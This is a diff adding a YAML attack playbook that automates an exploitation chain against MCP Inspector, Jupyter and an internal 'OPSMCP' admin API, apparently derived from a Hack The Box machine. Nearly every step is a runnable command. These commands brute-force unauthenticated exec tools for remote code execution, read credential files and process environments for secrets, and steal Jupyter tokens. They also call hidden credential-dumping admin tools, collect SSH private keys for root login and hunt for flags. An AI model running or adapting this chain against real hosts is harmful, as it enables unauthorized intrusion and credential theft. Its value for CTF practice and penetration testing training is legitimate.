@@ -1,0 +1,391 @@
+name: "MCP Inspector & Debug Service Security Assessment"
+description: >
+  Security assessment of MCP (Model Context Protocol) Inspector services, Jupyter
+  Notebook servers, and debug/admin portals commonly found together. Covers MCP
+  exec tool abuse, Jupyter token discovery, OPSMCP hidden admin tools, and privilege
+  escalation chains. Based on real HTB-DevHub exploitation chain.
+version: "2.0"
+target_required: true
+vars:
+  mcp_port: "6274"
+  jupyter_port: "8888"
+  opsmcp_port: "5000"
+  web_port: "80"
+vars_description:
+  mcp_port: "Port of the MCP Inspector service"
+  jupyter_port: "Port of Jupyter Notebook"
+  opsmcp_port: "Port of OPSMCP HTTP API (often internal/localhost)"
+  web_port: "Port of the web server / redirect"
+preflight:
+  name: preflight_check
+  description: "Verify connectivity to target and check tool availability"
+  steps:
+    - name: connectivity
+      description: "Verify target connectivity and open relevant ports"
+      command: >
+        echo "=== Connectivity check ===";
+        ping -c 1 -W 3 "{target}" 2>&1 | head -2;
+        echo "=== Port scan ===";
+        for p in {mcp_port} {jupyter_port} {opsmcp_port} {web_port} 22; do
+          timeout 2 bash -c "echo >/dev/tcp/{target}/\$p" 2>/dev/null &&
+            echo "Port \$p: OPEN" || echo "Port \$p: closed";
+        done
+    - name: tools_check
+      description: "Verify required tools"
+      command: >
+        which curl nmap python3 nuclei websocat 2>&1;
+        python3 -c "import json,sys; print('Python OK')" 2>&1
+steps:
+  - name: preamble
+    description: "Create output directories"
+    command: >
+      mkdir -p "{case_dir}/recon" "{case_dir}/mcp" "{case_dir}/jupyter"
+      "{case_dir}/opsmcp" "{case_dir}/exploit" "{case_dir}/loot"
+      "{case_dir}/report"{newline}
+      echo "Directories ready" > "{case_dir}/preamble.txt"
+  - name: nmap_scan
+    description: "Full port scan to discover all services"
+    command: >
+      nmap -Pn -p- --min-rate=1000 -T4 -oN "{case_dir}/recon/nmap_full.txt" "{target}" 2>&1;
+      echo "" >> "{case_dir}/recon/nmap_full.txt";
+      nmap -sV -sC -p $(grep ^[0-9] "{case_dir}/recon/nmap_full.txt" 2>/dev/null | grep open | awk -F/ '{print $1}' | tr '\\n' ',' | sed 's/,$//') "{target}" -oN "{case_dir}/recon/nmap_services.txt" 2>&1
+  - name: mcp_discovery
+    description: "Discover MCP Inspector service and enumerate its API surface"
+    command: >
+      echo "=== MCP Inspector discovery ===" > "{case_dir}/mcp/mcp_discovery.txt{newline}"
+      # Check main page
+      curl -sk "http://{target}:{mcp_port}/" 2>&1 | head -50 >> "{case_dir}/mcp/mcp_discovery.txt";
+      echo "" >> "{case_dir}/mcp/mcp_discovery.txt";
+      echo "--- MCP API discovery ---" >> "{case_dir}/mcp/mcp_discovery.txt";
+      for ep in "/api/mcp/tools/list" "/api/mcp/tools/execute" "/api/mcp/tools" "/api/tools" \
+                "/mcp/tools/list" "/mcp/tools/execute" "/api/mcp/servers" \
+                "/api/mcp/servers/list" "/api/mcp/info" "/api/info" \
+                "/sse" "/message" "/healthz" "/readyz"; do
+        RESULT=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "http://{target}:{mcp_port}$ep" 2>/dev/null);
+        if [ "$RESULT" != "000" ]; then
+          echo "  $ep -> HTTP $RESULT" >> "{case_dir}/mcp/mcp_discovery.txt";
+          if [ "$RESULT" = "200" ] || [ "$RESULT" = "405" ]; then
+            echo "--- Content for $ep ---" >> "{case_dir}/mcp/mcp_discovery.txt";
+            curl -sk --max-time 5 "http://{target}:{mcp_port}$ep" 2>&1 | head -30 >> "{case_dir}/mcp/mcp_discovery.txt";
+          fi;
+        fi;
+      done
+  - name: mcp_tools_enum
+    description: "Enumerate all MCP tools and test unauthenticated exec"
+    command: >
+      echo "=== MCP tool enumeration ===" > "{case_dir}/mcp/mcp_tools.txt{newline}"
+      for server_id in "pwn" "main" "default" "server" "mcp" "ops" "admin" "test"; do
+        for action in "list" "execute"; do
+          for method in "POST" "GET"; do
+            if [ "$method" = "POST" ]; then
+              RESULT=$(curl -sk --max-time 5 -X POST \
+                "http://{target}:{mcp_port}/api/mcp/tools/$action" \
+                -H "Content-Type: application/json" \
+                -d "{\"serverId\":\"$server_id\",\"toolName\":\"list\",\"parameters\":{}}" \
+                -w "\nHTTP_CODE:%{http_code}" 2>/dev/null);
+            else
+              RESULT=$(curl -sk --max-time 5 \
+                "http://{target}:{mcp_port}/api/mcp/tools/$action?serverId=$server_id" \
+                -w "\nHTTP_CODE:%{http_code}" 2>/dev/null);
+            fi;
+            HTTP=$(echo "$RESULT" | grep HTTP_CODE | awk -F: '{print $2}');
+            BODY=$(echo "$RESULT" | sed 's/HTTP_CODE.*//');
+            if [ -n "$HTTP" ] && [ "$HTTP" != "000" ] && [ "$HTTP" != "404" ]; then
+              echo "serverId=$server_id action=$action method=$method -> HTTP $HTTP" >> "{case_dir}/mcp/mcp_tools.txt";
+              echo "$BODY" | head -20 >> "{case_dir}/mcp/mcp_tools.txt";
+              echo "" >> "{case_dir}/mcp/mcp_tools.txt";
+            fi;
+          done;
+        done;
+      done
+  - name: mcp_exec_rce
+    description: "Test exec/code/command tools for RCE"
+    command: >
+      echo "=== MCP exec tool RCE test ===" > "{case_dir}/mcp/mcp_rce.txt{newline}"
+      for server_id in "pwn" "main" "default" "server" "mcp" "ops" "admin"; do
+        for tool_name in "exec" "run" "command" "shell" "bash" "cmd" "system" \
+                         "execute" "code" "python" "node" "sh"; do
+          RESULT=$(curl -sk --max-time 5 -X POST \
+            "http://{target}:{mcp_port}/api/mcp/tools/execute" \
+            -H "Content-Type: application/json" \
+            -d "{\"serverId\":\"$server_id\",\"toolName\":\"$tool_name\",\
+                 \"parameters\":{\"cmd\":\"id\",\"command\":\"id\",\
+                 \"code\":\"import os; print(os.system('id'))\"}}" \
+            -w "\nHTTP_CODE:%{http_code}" 2>/dev/null);
+          HTTP=$(echo "$RESULT" | grep HTTP_CODE | awk -F: '{print $2}');
+          BODY=$(echo "$RESULT" | sed 's/HTTP_CODE.*//');
+          if [ -n "$HTTP" ] && [ "$HTTP" != "000" ] && [ "$HTTP" != "404" ] && [ "$HTTP" != "400" ]; then
+            echo "serverId=$server_id tool=$tool_name -> HTTP $HTTP" >> "{case_dir}/mcp/mcp_rce.txt";
+            echo "$BODY" | head -10 >> "{case_dir}/mcp/mcp_rce.txt";
+            echo "" >> "{case_dir}/mcp/mcp_rce.txt";
+            if echo "$BODY" | grep -qiE "(uid=|root|mcp|user)"; then
+              echo "*** RCE CONFIRMED with serverId=$server_id tool=$tool_name ***" >> "{case_dir}/mcp/mcp_rce.txt";
+            fi;
+          fi;
+        done;
+      done
+  - name: mcp_filesystem_enum
+    description: "Enumerate filesystem via MCP RCE"
+    command: >
+      echo "=== Filesystem enumeration via MCP RCE ===" > "{case_dir}/mcp/fs_enum.txt{newline}"
+      for cmd in "id" "uname -a" "cat /etc/passwd" "ls -la /home/" \
+                 "ls -la /opt/" "ls -la /root/" "find / -name *.jupyter* 2>/dev/null" \
+                 "find / -name *.env* 2>/dev/null" "find / -name *server_config* 2>/dev/null" \
+                 "find / -name *config.json 2>/dev/null | head -20" \
+                 "ps aux | head -40" "cat /etc/ssh/sshd_config | grep -E '(Port|PermitRoot)'" \
+                 "env | grep -iE '(key|token|secret|password|api)'" \
+                 "ls -la /usr/local/bin/"; do
+        echo "--- CMD: $cmd ---" >> "{case_dir}/mcp/fs_enum.txt";
+        curl -sk --max-time 10 -X POST "http://{target}:{mcp_port}/api/mcp/tools/execute" \
+          -H "Content-Type: application/json" \
+          -d "{\"serverId\":\"pwn\",\"toolName\":\"exec\",\"parameters\":{\"cmd\":\"$cmd\"}}" 2>/dev/null \
+          | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('result',{}).get('output',json.dumps(d,indent=2))[:2000])" 2>/dev/null \
+          >> "{case_dir}/mcp/fs_enum.txt" || echo "(failed)" >> "{case_dir}/mcp/fs_enum.txt";
+      done
+  - name: jupyter_discovery
+    description: "Discover Jupyter Notebook config and token"
+    command: >
+      echo "=== Jupyter discovery ===" > "{case_dir}/jupyter/jupyter_discovery.txt{newline}"
+      # Check port
+      curl -sk --max-time 5 "http://{target}:{jupyter_port}/" -o /dev/null -w "Jupyter HTTP: %{http_code}\\n" >> "{case_dir}/jupyter/jupyter_discovery.txt";
+      # Try to find Jupyter config via MCP RCE
+      curl -sk --max-time 10 -X POST "http://{target}:{mcp_port}/api/mcp/tools/execute" \
+        -H "Content-Type: application/json" \
+        -d "{\"serverId\":\"pwn\",\"toolName\":\"exec\",\"parameters\":{\"cmd\":\"cat /home/*/.jupyter/jupyter_server_config.json 2>/dev/null; cat /root/.jupyter/jupyter_server_config.json 2>/dev/null; cat /home/*/.jupyter/jupyter_notebook_config.json 2>/dev/null; cat /opt/jupyter/*.json 2>/dev/null\"}}" \
+        2>/dev/null | python3 -c "
+import json, sys
+try:
+    d = json.load(sys.stdin)
+    output = d.get('result',{}).get('output','')
+    print(output[:2000])
+except: print(json.dumps(d, indent=2)[:500])
+" 2>/dev/null >> "{case_dir}/jupyter/jupyter_discovery.txt";
+      echo "" >> "{case_dir}/jupyter/jupyter_discovery.txt";
+      echo "--- Direct Jupyter API check ---" >> "{case_dir}/jupyter/jupyter_discovery.txt";
+      curl -sk --max-time 5 "http://{target}:{jupyter_port}/api/status" 2>&1 >> "{case_dir}/jupyter/jupyter_discovery.txt";
+      echo "" >> "{case_dir}/jupyter/jupyter_discovery.txt";
+      curl -sk --max-time 5 "http://{target}:{jupyter_port}/api/kernels" 2>&1 >> "{case_dir}/jupyter/jupyter_discovery.txt"
+  - name: jupyter_access
+    description: "Access Jupyter WebSocket with discovered token and execute Python"
+    command: >
+      echo "=== Jupyter access ===" > "{case_dir}/jupyter/jupyter_access.txt{newline}"
+      # Extract token from discovery
+      TOKEN=$(python3 -c "
+import json, re, sys
+try:
+    d = json.load(open('{case_dir}/jupyter/jupyter_discovery.txt'))
+    t = d.get('result',{}).get('output','')
+    m = re.search(r'token[\\\"']\s*:\s*[\\\"']([^\\\"']+)', t)
+    if m: print(m.group(1))
+except:
+    import os
+    try:
+        data = open('{case_dir}/jupyter/jupyter_discovery.txt').read()
+        m = re.search(r'([a-f0-9]{40,})', data)
+        if m: print(m.group(1))
+    except: pass
+" 2>/dev/null);
+      if [ -n "$TOKEN" ]; then
+        echo "Jupyter token found: $TOKEN" >> "{case_dir}/jupyter/jupyter_access.txt";
+        echo "" >> "{case_dir}/jupyter/jupyter_access.txt";
+        echo "--- Kernel list (authenticated) ---" >> "{case_dir}/jupyter/jupyter_access.txt";
+        curl -sk --max-time 5 "http://{target}:{jupyter_port}/api/kernels?token=$TOKEN" 2>&1 >> "{case_dir}/jupyter/jupyter_access.txt";
+        echo "" >> "{case_dir}/jupyter/jupyter_access.txt";
+        echo "--- Execute Python via kernel ---" >> "{case_dir}/jupyter/jupyter_access.txt";
+        python3 -c "
+import json, urllib.request, sys
+try:
+    # Create kernel
+    data = json.dumps({'name': 'python3'}).encode()
+    req = urllib.request.Request(f'http://{target}:{jupyter_port}/api/kernels?token={TOKEN}', data=data, headers={'Content-Type':'application/json'}, method='POST')
+    resp = json.loads(urllib.request.urlopen(req, timeout=10).read())
+    kid = resp.get('id','')
+    print(f'Kernel ID: {kid}')
+    # Execute code
+    exec_data = json.dumps({'code':'import os,json; print(json.dumps(dict(os.environ)))'}).encode()
+    # Use kernels/{kid}/execute via WebSocket (for real use) or /api/executions
+    print('To access, connect WebSocket:')
+    print(f'  ws://{target}:{jupyter_port}/api/kernels/{kid}/channels?token={TOKEN}')
+except Exception as e:
+    print(f'Jupyter access error: {e}')
+" 2>&1 >> "{case_dir}/jupyter/jupyter_access.txt";
+      else
+        echo "No Jupyter token found automatically." >> "{case_dir}/jupyter/jupyter_access.txt";
+        echo "Try manual search in /home/, /opt/, /root/ via MCP RCE" >> "{case_dir}/jupyter/jupyter_access.txt";
+      fi
+  - name: internal_service_discovery
+    description: "Discover internal services via MCP RCE (curl localhost ports)"
+    command: >
+      echo "=== Internal service discovery ===" > "{case_dir}/recon/internal_services.txt{newline}"
+      for port in 5000 3000 8080 8000 9000 4000 5432 6379 27017 9200 5601 9090; do
+        RESULT=$(curl -sk --max-time 10 -X POST "http://{target}:{mcp_port}/api/mcp/tools/execute" \
+          -H "Content-Type: application/json" \
+          -d "{\"serverId\":\"pwn\",\"toolName\":\"exec\",\"parameters\":{\"cmd\":\"curl -sk --max-time 3 http://127.0.0.1:$port/ | head -c 200\"}}" \
+          2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('result',{}).get('output','')[:200])" 2>/dev/null);
+        if [ -n "$RESULT" ] && [ "$RESULT" != "''" ] && [ "$RESULT" != "" ]; then
+          echo "Port $port: $RESULT" >> "{case_dir}/recon/internal_services.txt";
+        fi;
+      done
+  - name: opsmcp_discovery
+    description: "Discover OPSMCP HTTP API on localhost and enumerate endpoints"
+    command: >
+      echo "=== OPSMCP discovery ===" > "{case_dir}/opsmcp/opsmcp_discovery.txt{newline}"
+      for port in {opsmcp_port} 5000 5001 8080; do
+        echo "--- Port $port ---" >> "{case_dir}/opsmcp/opsmcp_discovery.txt";
+        curl -sk --max-time 10 -X POST "http://{target}:{mcp_port}/api/mcp/tools/execute" \
+          -H "Content-Type: application/json" \
+          -d "{\"serverId\":\"pwn\",\"toolName\":\"exec\",\"parameters\":{\"cmd\":\"curl -sk --max-time 3 http://127.0.0.1:$port/ 2>&1 | head -c 500\"}}" \
+          2>/dev/null | python3 -c "
+import json, sys
+try:
+    d = json.load(sys.stdin)
+    output = d.get('result',{}).get('output','')
+    if output: print(output[:500])
+except: print('(no output)')
+" 2>/dev/null >> "{case_dir}/opsmcp/opsmcp_discovery.txt";
+      done;
+      echo "" >> "{case_dir}/opsmcp/opsmcp_discovery.txt";
+      echo "--- Endpoint fuzzing OPSMCP ---" >> "{case_dir}/opsmcp/opsmcp_discovery.txt";
+      for ep in "/api/mcp/tools/list" "/api/mcp/tools/execute" "/api/tools" "/tools" \
+                 "/api/status" "/api/health" "/api/info" "/admin" "/debug"; do
+        RESULT=$(curl -sk --max-time 10 -X POST "http://{target}:{mcp_port}/api/mcp/tools/execute" \
+          -H "Content-Type: application/json" \
+          -d "{\"serverId\":\"pwn\",\"toolName\":\"exec\",\"parameters\":{\"cmd\":\"curl -sk --max-time 3 http://127.0.0.1:${opsmcp_port}$ep 2>&1\"}}" \
+          2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('result',{}).get('output','')[:200])" 2>/dev/null);
+        if [ -n "$RESULT" ] && [ "$RESULT" != "''" ]; then
+          echo "  $ep -> $RESULT" >> "{case_dir}/opsmcp/opsmcp_discovery.txt";
+        fi;
+      done
+  - name: opsmcp_api_key_extract
+    description: "Extract OPSMCP API key from process environment"
+    command: >
+      echo "=== OPSMCP API key extraction ===" > "{case_dir}/opsmcp/api_key_extract.txt{newline}"
+      curl -sk --max-time 10 -X POST "http://{target}:{mcp_port}/api/mcp/tools/execute" \
+        -H "Content-Type: application/json" \
+        -d "{\"serverId\":\"pwn\",\"toolName\":\"exec\",\"parameters\":{\"cmd\":\"cat /proc/*/environ 2>/dev/null | tr '\\\\0' '\\\\n' | grep -iE '(api_key|apikey|token|secret|password|opsmcp)' | sort -u\"}}" \
+        2>/dev/null | python3 -c "
+import json, sys
+try:
+    d = json.load(sys.stdin)
+    output = d.get('result',{}).get('output','')
+    if output: print(output[:2000])
+    else: print('No API keys found in /proc/*/environ')
+except Exception as e:
+    print(f'Error: {e}')
+" 2>/dev/null >> "{case_dir}/opsmcp/api_key_extract.txt"
+  - name: opsmcp_hidden_tools
+    description: "Discover and exploit OPSMCP hidden underscore-prefixed admin tools"
+    command: >
+      echo "=== OPSMCP hidden admin tools ===" > "{case_dir}/opsmcp/hidden_tools.txt{newline}"
+      API_KEY=$(python3 -c "
+import re, sys
+try:
+    data = open('{case_dir}/opsmcp/api_key_extract.txt').read()
+    m = re.search(r'key[=:]\s*([A-Za-z0-9_]+)', data)
+    if m: print(m.group(1))
+    else:
+        m2 = re.search(r'([a-zA-Z0-9_]{20,50})', data)
+        if m2: print(m2.group(1))
+except: pass
+" 2>/dev/null);
+      if [ -n "$API_KEY" ]; then
+        echo "API Key: $API_KEY" >> "{case_dir}/opsmcp/hidden_tools.txt";
+      else
+        echo "No API key found, trying without auth..." >> "{case_dir}/opsmcp/hidden_tools.txt";
+        API_KEY="test";
+      fi;
+      echo "" >> "{case_dir}/opsmcp/hidden_tools.txt";
+      echo "--- Enumerate OPSMCP tools ---" >> "{case_dir}/opsmcp/hidden_tools.txt";
+      curl -sk --max-time 10 -X POST "http://{target}:{mcp_port}/api/mcp/tools/execute" \
+        -H "Content-Type: application/json" \
+        -d "{\"serverId\":\"pwn\",\"toolName\":\"exec\",\"parameters\":{\"cmd\":\"curl -sk --max-time 5 -X POST http://127.0.0.1:${opsmcp_port}/api/mcp/tools/list -H 'Content-Type: application/json' -H 'X-API-Key: $API_KEY' -d '{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"id\\\":1,\\\"method\\\":\\\"tools/list\\\"}' 2>&1\"}}" \
+        2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('result',{}).get('output','')[:2000])" 2>/dev/null >> "{case_dir}/opsmcp/hidden_tools.txt";
+      echo "" >> "{case_dir}/opsmcp/hidden_tools.txt";
+      echo "--- Call hidden debug/admin tools ---" >> "{case_dir}/opsmcp/hidden_tools.txt";
+      for tool in "_admin_dump" "_debug_mode" "_internal_status" "_debug" \
+                  "admin_dump" "debug_mode" "dump_credentials" "system_info"; do
+        for target_arg in "all" "ssh_keys" "credentials" "config" "users" "system"; do
+          RESULT=$(curl -sk --max-time 10 -X POST "http://{target}:{mcp_port}/api/mcp/tools/execute" \
+            -H "Content-Type: application/json" \
+            -d "{\"serverId\":\"pwn\",\"toolName\":\"exec\",\"parameters\":{\"cmd\":\"curl -sk --max-time 5 -X POST http://127.0.0.1:${opsmcp_port}/api/mcp/tools/execute -H 'Content-Type: application/json' -H 'X-API-Key: $API_KEY' -d '{\\\"serverId\\\":\\\"ops\\\",\\\"toolName\\\":\\\"$tool\\\",\\\"parameters\\\":{\\\"target\\\":\\\"$target_arg\\\"}}' 2>&1\"}}" \
+            2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('result',{}).get('output','')[:500])" 2>/dev/null);
+          if [ -n "$RESULT" ] && [ "$RESULT" != "''" ] && [ "$RESULT" != "" ]; then
+            echo "  tool=$tool target=$target_arg -> $RESULT" >> "{case_dir}/opsmcp/hidden_tools.txt";
+          fi;
+        done;
+      done
+  - name: privilege_escalation
+    description: "Exploit SSH key leak or credential dump for privilege escalation"
+    command: >
+      echo "=== Privilege escalation ===" > "{case_dir}/exploit/privesc.txt{newline}"
+      # Extract any SSH private keys found
+      curl -sk --max-time 10 -X POST "http://{target}:{mcp_port}/api/mcp/tools/execute" \
+        -H "Content-Type: application/json" \
+        -d "{\"serverId\":\"pwn\",\"toolName\":\"exec\",\"parameters\":{\"cmd\":\"find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null; find /home -name '.ssh' -type d 2>/dev/null; ls -la /root/.ssh/ 2>/dev/null; cat /root/.ssh/authorized_keys 2>/dev/null; cat /root/.ssh/id_rsa 2>/dev/null; cat /home/*/.ssh/authorized_keys 2>/dev/null\"}}" \
+        2>/dev/null | python3 -c "
+import json, sys
+try:
+    d = json.load(sys.stdin)
+    print(d.get('result',{}).get('output','')[:2000])
+except: print(json.dumps(d, indent=2)[:500])
+" 2>/dev/null > "{case_dir}/exploit/ssh_keys_found.txt";
+      if [ -s "{case_dir}/exploit/ssh_keys_found.txt" ] && [ "$(cat '{case_dir}/exploit/ssh_keys_found.txt' | wc -c)" -gt 10 ]; then
+        echo "SSH keys or authorized_keys found!" >> "{case_dir}/exploit/privesc.txt";
+        cat "{case_dir}/exploit/ssh_keys_found.txt" >> "{case_dir}/exploit/privesc.txt";
+      fi;
+      echo "" >> "{case_dir}/exploit/privesc.txt";
+      echo "--- Attempt loopback SSH with found keys ---" >> "{case_dir}/exploit/privesc.txt";
+      echo "1. Copy key to /tmp/key && chmod 600 /tmp/key" >> "{case_dir}/exploit/privesc.txt";
+      echo "2. ssh -i /tmp/key -o StrictHostKeyChecking=no root@127.0.0.1" >> "{case_dir}/exploit/privesc.txt";
+      echo "3. cat /root/root.txt" >> "{case_dir}/exploit/privesc.txt"
+  - name: flag_capture
+    description: "Capture all flags from the target"
+    command: >
+      echo "=== Flag capture ===" > "{case_dir}/loot/flags.txt{newline}"
+      for f in "root.txt" "user.txt" "flag.txt" ".flag" "flag"; do
+        curl -sk --max-time 10 -X POST "http://{target}:{mcp_port}/api/mcp/tools/execute" \
+          -H "Content-Type: application/json" \
+          -d "{\"serverId\":\"pwn\",\"toolName\":\"exec\",\"parameters\":{\"cmd\":\"find / -name '$f' -type f 2>/dev/null | head -10\"}}" \
+          2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('result',{}).get('output',''))" 2>/dev/null > /tmp/flag_paths.txt;
+        if [ -s /tmp/flag_paths.txt ]; then
+          echo "Found $f at:" >> "{case_dir}/loot/flags.txt";
+          cat /tmp/flag_paths.txt >> "{case_dir}/loot/flags.txt";
+        fi;
+      done
+  - name: compile_report
+    description: "Compile full exploitation report"
+    command: >
+      echo "# MCP Inspector & Debug Service Exploitation Report" > "{case_dir}/report/exploit_report.md{newline}"
+      echo "Target: {target}" >> "{case_dir}/report/exploit_report.md";
+      echo "Date: $(date -u)" >> "{case_dir}/report/exploit_report.md";
+      echo "" >> "{case_dir}/report/exploit_report.md";
+      echo "## 1. Services Discovered" >> "{case_dir}/report/exploit_report.md";
+      nmap_open=$(grep "^[0-9]" "{case_dir}/recon/nmap_services.txt" 2>/dev/null | grep open);
+      if [ -n "$nmap_open" ]; then echo "$nmap_open" >> "{case_dir}/report/exploit_report.md"; fi;
+      echo "" >> "{case_dir}/report/exploit_report.md";
+      echo "## 2. MCP Inspector" >> "{case_dir}/report/exploit_report.md";
+      if grep -q "RCE CONFIRMED" "{case_dir}/mcp/mcp_rce.txt" 2>/dev/null; then
+        echo "- **MCP exec tool RCE: CONFIRMED**" >> "{case_dir}/report/exploit_report.md";
+      fi;
+      echo "" >> "{case_dir}/report/exploit_report.md";
+      echo "## 3. Jupyter Access" >> "{case_dir}/report/exploit_report.md";
+      if grep -q "token found" "{case_dir}/jupyter/jupyter_access.txt" 2>/dev/null; then
+        echo "- **Jupyter token found and accessed**" >> "{case_dir}/report/exploit_report.md";
+      fi;
+      echo "" >> "{case_dir}/report/exploit_report.md";
+      echo "## 4. OPSMCP Hidden Tools" >> "{case_dir}/report/exploit_report.md";
+      if grep -q "_admin_dump" "{case_dir}/opsmcp/hidden_tools.txt" 2>/dev/null; then
+        echo "- **OPSMCP hidden admin tools discovered**" >> "{case_dir}/report/exploit_report.md";
+      fi;
+      echo "" >> "{case_dir}/report/exploit_report.md";
+      echo "## 5. Privilege Escalation" >> "{case_dir}/report/exploit_report.md";
+      if grep -q "SSH keys" "{case_dir}/exploit/privesc.txt" 2>/dev/null; then
+        echo "- **SSH keys found - privilege escalation possible**" >> "{case_dir}/report/exploit_report.md";
+      fi;
+      echo "" >> "{case_dir}/report/exploit_report.md";
+      echo "## 6. Flags" >> "{case_dir}/report/exploit_report.md";
+      cat "{case_dir}/loot/flags.txt" 2>/dev/null >> "{case_dir}/report/exploit_report.md"
+postflight:
+  - name: cleanup
+    description: "Clean up temporary files"
+    command: rm -f /tmp/flag_paths.txt 2>/dev/null; echo "Cleanup done" > "{case_dir}/cleanup.txt"
